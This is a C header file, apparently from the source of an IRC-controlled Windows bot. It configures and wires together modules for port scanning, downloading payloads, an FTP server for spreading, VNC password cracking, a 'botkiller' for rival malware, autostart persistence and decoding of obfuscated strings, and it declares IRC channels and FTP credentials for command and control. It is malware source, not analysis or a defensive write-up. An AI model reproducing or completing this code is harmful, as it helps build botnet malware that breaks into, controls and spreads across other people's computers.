#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#define WIN32_LEAN_AND_MEAN					// Good to use.
#pragma optimize("gsy", on)					// Global optimization, Short sequences, Frame pointers.
#pragma comment(linker, "/RELEASE")			// Release code
#pragma comment(linker, "/opt:nowin98")
#pragma comment(linker, "/ALIGN:4096")		// This will save you some size on the executable.
#pragma comment(linker, "/IGNORE:4108 ")	// This is only here for when you use /ALIGN:4096.

//#define DEBUG

#ifdef DEBUG
	#pragma comment(linker, "/subsystem:console")
#else
	#pragma comment(linker, "/subsystem:windows")
#endif

//#ifdef DEBUG
//#define NO_INSTALL
//#define NO_REGISTRY
//#endif

//#define NO_VNC
//#define NO_FTPD
//#define NO_PATCHER
//#define NO_BOTKILLER

//includes
#include <windows.h>
#include <winsock2.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <shlobj.h>
#include <wininet.h>
#include <tchar.h>
#include <time.h>
#include <tlhelp32.h>
#include <shellapi.h>

#include "misc.h"
#include "downloader.h"
#include "tcpip.h"
#include "scanner.h"
#include "ftpd.h"
#include "vncps.h"
#include "patcher.h"
#include "botkiller.h"
#include "qvncpass.h"
#include "main.h"
#include "netapi.h"


//defines
#define MAX_LINE_SIZE 512
#define RECV_BUFFER_SIZE 2048
#define MAX_NICK_SIZE 32
#define MAX_WORDS 32
#define MAX_THREADS 512
#define MAX_SCAN_THREADS 128
#define DEF_PORTSCAN_DELAY 5

//Thread defines
#define BK_THREAD 2
#define SCAN_THREAD 3
#define SCANT_THREAD 4
#define DOWNLOAD_THREAD 5
#define PATCHER_THREAD 6
#define QVNCP_THREAD 7
#define FTP_THREAD 8
#define FTPTRANS_THREAD 9

//External variables
typedef struct CurThread {
	DWORD Type;
	HANDLE tHandle;
	SOCKET Sock;
} CurThread;

typedef struct IRCSERVERLIST 
{
	char *IrcServer;
	unsigned int IrcPort;
	BOOL UseServerPassword;
	char *IrcServerPassword;
} IRCSERVERLIST;

extern char BotToClone[MAX_PATH];
extern char BotToCloneDir[MAX_PATH];
extern CurThread Thread[MAX_THREADS];
extern char VNCChan[];
//extern char ExploitChannel[];
extern char InfoChan[];
extern char FileName[];
extern int FTPPort;
extern char FTPUser[];
extern char FTPPass[];
extern int TotalTransfers;
extern char TransferChannel[];

extern char CFTPHost[32];
extern int CFTPPort;
extern char CFTPUser[32];
extern char CFTPPass[32];
extern char CFTPFile[32];
extern char CFTPPath[32];
extern char CFTPHoldr[32];

extern char string_autostart_location[];
extern char string_autostart_description[];
extern char *Decode(char *s);
